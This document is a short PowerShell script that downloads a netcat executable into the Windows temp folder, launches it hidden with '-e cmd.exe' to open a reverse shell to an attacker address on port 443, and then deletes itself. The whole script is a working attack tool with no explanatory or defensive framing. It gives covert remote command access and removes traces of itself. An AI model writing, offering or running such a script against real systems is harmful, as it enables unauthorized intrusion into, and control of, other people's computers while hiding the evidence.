# 1. Enable TLS 1.2 for secure download
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# 2. Auto-detect OS architecture (32-bit or 64-bit)
$is64bit = [Environment]::Is64BitOperatingSystem
$ncUrl = if ($is64bit) {
    "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86_64/nc.exe"
} else {
    "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
}

# 3. Configuration
$ncPath     = "$env:TEMP\nc.exe"
$attackerIP = "192.168.1.100"
$port       = "443"

# 4. Download nc.exe (smart)
try {
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"
    exit 1
}

# 5. Execute reverse shell (hidden)
if (Test-Path $ncPath) {
    $args = "$attackerIP $port -e cmd.exe"
    Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden -NoNewWindow
}

# 6. Safe self-delete (only if script was run from a file)
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Start-Sleep -Seconds 2
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
}
